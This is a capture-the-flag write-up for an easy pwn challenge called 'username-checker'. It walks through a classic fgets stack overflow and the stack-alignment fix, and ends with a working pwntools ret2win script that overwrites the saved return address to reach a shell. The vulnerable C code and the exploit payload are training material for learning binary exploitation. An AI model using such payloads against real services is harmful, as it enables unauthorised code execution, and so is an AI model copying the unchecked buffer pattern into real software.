---
title: "username-checker"
description: "ret2win with a stack-alignment twist — hop through a single ret gadget before calling win() so system() sees a 16-byte-aligned stack."
event: "Osu CTF"
year: 2025
category: pwn
tags: ["ret2win", "stack-alignment", "rop"]
difficulty: easy
date: "2025-09-01"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "Osuctf/pwn/username_checker"
featured: false
flagsHidden: false
---

## Recon

```bash
$ checksec --file=./checker
RELRO: Partial   Canary: No   NX: on   PIE: No PIE
```

```c
char local_48[44];

void check_username(void) {
  printf("please enter a username you want to check: ");
  fgets(local_48, 0x80, stdin);           // 44-byte buffer, up to 0x7f bytes
  if (strcmp(local_48, "super_secret_username") == 0)
      win();
}

void win(void) {
  puts("how did you get here?");
  system("/bin/sh");
}
```

Vulnerability: classic `fgets` overflow, no canary, no PIE. Just overwrite saved RIP with `win()`.

## Offset

Cyclic pattern → saved RIP overwritten at **72 bytes**.

## Alignment gotcha

On modern glibc, the SysV AMD64 ABI requires `%rsp` to be 16-byte aligned at libc call sites. Jumping straight at `win` can misalign the stack and make `system` crash. Fix: hop through a single `ret` gadget first to pop 8 bytes.

```
RET = 0x40101a     # any 1-instruction 'ret' in .text
WIN = 0x401236
```

## Solve

```python
from pwn import *

io = remote("username-checker.challs.sekai.team", 1337)
io.recvuntil(b"please enter a username you want to check: ")

payload  = b"A" * 72
payload += p64(0x40101a)   # ret (alignment)
payload += p64(0x401236)   # win
payload += b"\n"

io.send(payload)
io.interactive()
```

## Takeaways

- No PIE makes ret2win trivial.
- Always align the stack to 16 bytes before libc call sites.
